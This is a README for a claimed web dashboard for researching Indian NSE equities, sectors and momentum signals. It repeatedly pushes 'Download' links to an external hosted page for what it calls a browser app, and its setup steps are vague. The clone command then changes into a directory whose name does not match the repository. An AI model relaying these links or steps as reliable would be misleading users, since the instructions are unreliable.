# Advanced Momentum Terminal - Quantitative Trading Research Dashboard 2026

> **Advanced Momentum Terminal is a browser-based research workspace for investigating Indian markets, NSE-listed equities, global macro indexes, and momentum signals in the latest available build.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benimward9621/advanced-nse-momentum-terminal?style=flat-square)](https://github.com/benimward9621/advanced-nse-momentum-terminal)

---

<p align="center">
  <a href="https://benimward9621.github.io/advanced-nse-momentum-terminal/">
    <img src="https://img.shields.io/badge/Download-Advanced%20Momentum%20Terminal%20Latest-brightgreen?style=for-the-badge" alt="Download Advanced Momentum Terminal">
  </a>
</p>

> **[Download Advanced Momentum Terminal Latest](https://benimward9621.github.io/advanced-nse-momentum-terminal/)**

---

[Download Latest Build](https://benimward9621.github.io/advanced-nse-momentum-terminal/)

---

## Product Overview

Advanced Momentum Terminal consolidates multiple market-analysis tools in a single web application. The dashboard helps users investigate NSE equities, Indian sectors, ETFs, and global macro indexes with relative-strength studies, momentum screening, technical charts, and market-breadth measures.

Use it for either wide market discovery or detailed security-level research. Compare how sectors are performing, inspect individual-stock charts, assess volatility-adjusted trends, and follow market leadership through relative rotation views.

---

## What It Includes

- Find NSE equities with Relative Strength momentum screening.
- Inspect individual securities through dedicated charts and technical analysis views.
- Measure trend behavior with a volatility-adjusted trend indicator.
- Review margin trading facility information alongside relevant market context.
- Study Indian sector movement using relative rotation graphs.
- Compare sector and ETF performance with interactive heatmaps.
- Monitor broad-market systemic breadth indicators.
- Synchronize market information using Upstox and yfinance.
- Store and process structured research data through a DuckDB-backed pipeline.

---

## Getting Started

First, clone the repository and enter its directory:

```bash
git clone https://github.com/benimward9621/advanced-nse-momentum-terminal.git
cd Advanced-Momentum-Terminal
```

To inspect the project locally, run the web application with a static web server and visit the local address it provides. When the repository contains a dedicated setup document or dependency manifest, follow those project instructions before launching the dashboard.

The hosted version is available here:

[Download and open the latest build](https://benimward9621.github.io/advanced-nse-momentum-terminal/)

---

## Research Workflow

The following sequence provides one practical way to use the dashboard:

1. Launch the dashboard and choose the Indian-market or global-macro data relevant to the research task.
2. Use the momentum screener to locate securities with comparatively strong performance.
3. Open a selected security in the single-stock analysis view.
4. Examine its technical charts and volatility-adjusted trend information.
5. Use the heatmap and sector-rotation view to compare sectors and ETFs.
6. Study relative rotation graphs for signs of changing leadership or deterioration.
7. Check market-breadth readings to interpret security-level signals within the wider market.
8. Synchronize the latest available data before starting another session when fresh inputs are needed.

---

## Data and Pipeline Configuration

Maintain data-source and pipeline options in the configuration used by the local deployment. Set up the available Upstox and yfinance synchronization inputs according to the repository files, and ensure the DuckDB pipeline can reach its configured storage path.

A representative configuration can look like this:

```yaml
data_sources:
  - upstox
  - yfinance

storage:
  engine: duckdb

market_scope:
  - NSE equities
  - Indian sectors
  - global macro indexes
```

The repository's own configuration files define the actual names and supported settings. When a provider requires credentials or private connection information, keep those values out of committed configuration files.

---

## Requirements

- A current web browser.
- A way to serve the cloned project locally over the web.
- Access to the market-data providers enabled by the deployment.
- Storage compatible with DuckDB for the research pipeline.
- Enough disk space for synchronized research data.
- Upstox access for workflows that use Upstox synchronization.
- yfinance available for workflows based on yfinance synchronization.

---

## Frequently Asked Questions

### What type of user is Advanced Momentum Terminal designed for?

The dashboard is aimed at people researching Indian markets, NSE equities, sectors, ETFs, global macro indexes, and momentum-related signals.

### Where can I find the latest build?

Open [Download Latest Build](https://benimward9621.github.io/advanced-nse-momentum-terminal/). New versions are delivered through the project's hosted web deployment.

### What market-data providers can it use?

The project supports synchronization through Upstox and yfinance. The instruments and fields available to you depend on the provider selected and its configuration.

### How is the application configured?

Configuration is handled through the project's configuration and data-pipeline files. Review the repository layout to find the supported file names and available options.

### Why might current data be missing from the dashboard?

Check that the intended provider is configured and that synchronization has finished successfully. Confirm that the DuckDB storage path is reachable and that the chosen instrument or market group is included in the active source.

### Is local synchronization required to use the dashboard?

The hosted build can be opened in a browser. Local workflows may additionally depend on the configured Upstox or yfinance synchronization process and the DuckDB pipeline.

---

## Roadmap

- Further develop momentum and relative-strength research workflows.
- Add to the comparison tools for sectors, ETFs, and macro indexes.
- Strengthen breadth and rotation analysis across market categories.
- Continue improving provider synchronization and DuckDB pipeline integration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
